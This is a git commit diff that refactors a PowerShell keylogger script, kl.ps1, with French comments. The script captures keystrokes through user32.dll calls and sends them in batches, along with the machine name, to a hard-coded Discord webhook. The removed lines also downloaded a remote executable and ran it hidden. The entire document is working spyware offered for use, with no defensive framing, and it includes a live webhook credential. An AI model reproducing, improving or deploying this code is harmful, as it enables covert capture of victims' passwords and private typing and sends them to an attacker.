ae09a90021cff5176f4f0365c7164a5f927405d6
hamzza00 <hamzaouajoura@gmail.com>
2025-11-30 06:18:23 +0100

    Refactor keylogger script for improved functionality

--- kl.ps1
+++ kl.ps1
@@ -1,32 +1,41 @@
 $webhook = 'https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW'
 
-# Message de démarrage
-iwr $webhook -Method Post -Body (@{content="Keylogger double lancé – $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
+iwr $webhook -Method Post -Body (@{content="Keylogger natif AZERTY lancé – $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
 
-# 1. Télécharge et lance ton .exe parfait (logs propres AZERTY)
-iwr 'https://limewire.com/d/8fkqv#TRo9XUAhOT' -OutFile "$env:TEMP\k.exe"
-Start-Process "$env:TEMP\k.exe" -WindowStyle Hidden
-
-# 2. Keylogger brut en parallèle (comme avant, pour être sûr de rien perdre)
-$code = @'
+Add-Type @'
 using System;
 using System.Runtime.InteropServices;
+using System.Text;
 public class K {
-    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int k);
+    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
+    [DllImport("user32.dll")] public static extern int ToUnicode(uint vKey, uint scanCode, byte[] keyState, StringBuilder buff, int buffSize, uint flags);
 }
 '@
 
-Add-Type $code
+$buffer = ''
+while ($true) {
+    Start-Sleep -Milliseconds 30
 
-$buf = ''
-while($true){
-    Start-Sleep -m 30
-    for($i=8;$i -le 254;$i++){
-        if([K]::GetAsyncKeyState($i) -eq -32767){
-            $buf += [char]$i
-            if($buf.Length -ge 5){
-                iwr $webhook -Method Post -Body (@{content=$buf}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
-                $buf = ''
+    for ($i = 8; $i -le 254; $i++) {
+        if ([K]::GetAsyncKeyState($i) -eq -32767) {
+            $sb = New-Object Text.StringBuilder
+            $state = New-Object byte[] 256
+            GetKeyState(0x10) # Shift
+            [K]::ToUnicode($i, 0, $state, $sb, $sb.Capacity, 0) | Out-Null
+            $char = $sb.ToString()
+            if ($char.Length -eq 0) {
+                switch ($i) {
+                    8  { $char = '[BACKSPACE]' }
+                    13 { $char = "`n" }
+                    32 { $char = ' ' }
+                    default { $char = '' }
+                }
+            }
+            if ($i -ne 8) { $buffer += $char }
+
+            if ($buffer.Length -ge 20) {
+                iwr $webhook -Method Post -Body (@{content=$buffer}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
+                $buffer = ''
             }
         }
     }
